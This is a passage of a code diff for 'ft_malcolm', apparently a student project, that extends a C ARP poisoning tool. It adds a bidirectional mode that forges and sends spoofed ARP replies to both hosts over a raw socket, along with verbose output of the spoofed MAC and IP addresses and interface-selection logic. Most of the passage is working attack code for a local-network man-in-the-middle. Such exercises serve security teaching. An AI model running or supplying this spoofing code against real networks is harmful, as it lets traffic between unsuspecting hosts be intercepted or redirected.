+                            } 
+
+                        /**
+                        * Freeing the linked list of network interface of the local system
+                        */
+                        (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+                        return (RETURN_SUCCESS);
+                        }
+                    else
+                        {
+                        ft_printf("The network interface \"%s\" is not valid\nsearching for a valid network interface ...\n", ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_NETWORK_NAME]);
+                        break;
+                        }
+                    }
+                }
+
+            ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_actual_network_interfaces->ifa_next;
+            }
+
+        if(ptr_estc_lcl_actual_network_interfaces == NULL)
+            {
+            ft_printf("The network interface \"%s\" is not found\nsearching for a valid network interface ...\n", ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_NETWORK_NAME]);
+            }
+        }
+    else
+        {
+        /**
+        * Treat the case when the option network name is not set
         */
         }
 
@@ -2433,7 +2695,7 @@ uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm
                 */
 
                 #ifdef DEVELOPEMENT
-                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the socket to the found available interface  failed\n", __FILE__, __func__, __LINE__);
+                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the socket to the found available interface failed\n", __FILE__, __func__, __LINE__);
                 #endif
 
                 #ifdef DEMO
@@ -2615,6 +2877,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
     struct sockaddr_ll   estc_lcl_socket_addr;
     uint8_t              u8_lcl_packet[PACKET_MAX_LEN];
     uint8_t              u8_lcl_return_from_function;
+    uint8_t              u8_tmp_ip_addr_[IP_ADDRESS_BYTE_LEN];
 
     /**
     * Initialization of local variable
@@ -2635,6 +2898,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
     * Initialize the local structure to zero
     */
     (void) ft_bzero(&estc_lcl_socket_addr, sizeof(estc_lcl_socket_addr));
+    (void) ft_bzero(&u8_tmp_ip_addr_, sizeof(u8_tmp_ip_addr_));
 
     /**
     * Getting a valid interface
@@ -2652,7 +2916,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         */
 
         #ifdef DEVELOPEMENT
-        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get a valid interface  failed\n", __FILE__, __func__, __LINE__);
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get a valid interface failed\n", __FILE__, __func__, __LINE__);
         #endif
 
         #ifdef DEMO
@@ -2894,7 +3158,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         */
 
         #ifdef DEVELOPEMENT
-        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to Forge an ARP respond packet  failed\n", __FILE__, __func__, __LINE__);
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to Forge an ARP respond packet failed\n", __FILE__, __func__, __LINE__);
         #endif
 
         #ifdef DEMO
@@ -2917,6 +3181,11 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         */
         } 
 
+    if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_VERBOSE] != FALSE)
+        {
+        ft_printf("\n\033[2mSend an ARP reply\n    SOURCE:\n     mac address of reply: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n     IP address of reply: %u.%u.%u.%u\n    TARGET:\n     mac address of reply: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n     IP address of reply: %u.%u.%u.%u\033[0m\n", ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[4], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[5], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[4], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[5], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[3]);
+        }
+
     /**
     * Sending the forged arp reply
     */
@@ -2933,7 +3202,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         */
 
         #ifdef DEVELOPEMENT
-        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to send the forged arp reply  failed\n", __FILE__, __func__, __LINE__);
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to send the forged arp reply failed\n", __FILE__, __func__, __LINE__);
         #endif
 
         #ifdef DEMO
@@ -2963,6 +3232,195 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
     else
         {
         ft_printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
+        }
+
+    if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_argument_options_[MALCOLM_BIDIRECTIONAL] != FALSE)
+        {
+        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_COLOR] != FALSE)
+            {
+            ft_printf("For bidirectional sending an \033[32;1mARP\033[0m \033[35;1mreply\033[0m to the source address with spoofed target, please wait...\n");
+            }
+        else
+            {
+            ft_printf("For bidirectional sending an ARP reply to the target address with spoofed source, please wait...\n");
+            }
+
+        /**
+        * Check if the value of the option bidirectional is not correctly allocated
+        */
+        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_BIDIRECTIONAL] == NULL)
+            {
+            /**
+            * Treat the case when the value of the option bidirectional is not correctly allocated
+            */
+
+            #ifdef DEVELOPEMENT
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the value of the option bidirectional is not correctly allocated\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Return failure to indicate the value of the option bidirectional is not correctly allocated
+            */
+            return (RETURN_FAILURE);
+            }
+        else
+            {
+            /**
+            * Treat the case when the value of the option bidirectional is correctly allocated
+            */
+            }
+
+        (void) ft_memcpy(u8_tmp_ip_addr_, ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_, IP_ADDRESS_BYTE_LEN);
+        (void) ft_memcpy(ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_, ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_, IP_ADDRESS_BYTE_LEN);
+        (void) ft_memcpy(ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_, u8_tmp_ip_addr_, IP_ADDRESS_BYTE_LEN);
+
+        /**
+        * Getting the real source mac address from the argument option bidirectional
+        */
+        u8_lcl_return_from_function = RETURN_FAILURE;
+        u8_lcl_return_from_function = Fu8__get_mac_from_string(ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_BIDIRECTIONAL]);
+
+        /**
+        * Check if function to get the real source mac address from the argument option bidirectional succeeded
+        */
+        if(u8_lcl_return_from_function != RETURN_SUCCESS)
+            {
+            /**
+            * Treat the case when the function to get the real source mac address from the argument option bidirectional failed
+            */
+
+            //#ifdef DEVELOPEMENT
+            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the real source mac address from the argument option bidirectional failed\n", __FILE__, __func__, __LINE__);
+            //#endif
+
+            //#ifdef DEMO
+            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            //#endif
+
+            //#ifdef PRODUCTION
+            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+            //#endif
+
+            if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_COLOR] != FALSE)
+                {
+                ft_fprintf(STDERR_FILENO, "\033[31;1mft_malcolm\033[0m: invalid mac address: (\033[31;1m%s\033[0m)\n", ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_BIDIRECTIONAL]);
+                }
+            else
+                {
+                ft_fprintf(STDERR_FILENO, "ft_malcolm: invalid mac address: (%s)\n", ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_BIDIRECTIONAL]);
+                }
+
+            /**
+            * Return failure to indicate the function to get the real source mac address from the argument option bidirectional failed
+            */
+            return (RETURN_FAILURE);
+            }
+        else
+            {
+            /**
+            * Treat the case when function to get the real source mac address from the argument option bidirectional succeeded
+            */
+            } 
+
+        /**
+        * Forge an ARP respond packet
+        */
+        u8_lcl_return_from_function = RETURN_FAILURE;
+        u8_lcl_return_from_function = Fu8__forge_arp_respond(ptr_estc_lcl_ether_arp, ptr_estc_lcl_ether_header, ptr_cstc_pssd_malcolm_data);
+
+        /**
+        * Check if function to Forge an ARP respond packet succeeded
+        */
+        if(u8_lcl_return_from_function != RETURN_SUCCESS)
+            {
+            /**
+            * Treat the case when the function to Forge an ARP respond packet failed
+            */
+
+            #ifdef DEVELOPEMENT
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to Forge an ARP respond packet failed\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Return failure to indicate the function to Forge an ARP respond packet failed
+            */
+            return (RETURN_FAILURE);
+            }
+        else
+            {
+            /**
+            * Treat the case when function to Forge an ARP respond packet succeeded
+            */
+            } 
+
+        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_VERBOSE] != FALSE)
+            {
+            ft_printf("\n\033[2mSend an ARP reply\n    SOURCE:\n     mac address of reply: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n     IP address of reply: %u.%u.%u.%u\n    TARGET:\n     mac address of reply: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n     IP address of reply: %u.%u.%u.%u\033[0m\n", ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[4], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_sha)[5], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_spa)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[3], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[4], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tha)[5], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[0], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[1], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[2], ((uint8_t *) ptr_estc_lcl_ether_arp->arp_tpa)[3]);
+            }
+
+        /**
+        * Sending the forged arp reply
+        */
+        sszt_lcl_number_of_byte = RETURN_FAILURE;
+        sszt_lcl_number_of_byte = sendto(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *) &estc_lcl_socket_addr, sizeof(struct sockaddr_ll));
+
+        /**
+        * Check if function to send the forged arp reply succeeded
+        */
+        if(sszt_lcl_number_of_byte < 0)
+            {
+            /**
+            * Treat the case when the function to send the forged arp reply failed
+            */
+
+            #ifdef DEVELOPEMENT
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to send the forged arp reply failed\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Return failure to indicate the function to send the forged arp reply failed
+            */
+            return (RETURN_FAILURE);
+            }
+        else
+            {
+            /**
+            * Treat the case when function to send the forged arp reply succeeded
+            */
+            }
+
+        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_COLOR] != FALSE)
+            {
+            ft_printf("Sent an \033[32;1mARP\033[0m \033[35;1mreply\033[0m packet to the source.\n");
+            }
+        else
+            {
+            ft_printf("Sent an ARP reply packet packet to the source.\n");
+            }
         }
 
     return (RETURN_SUCCESS);
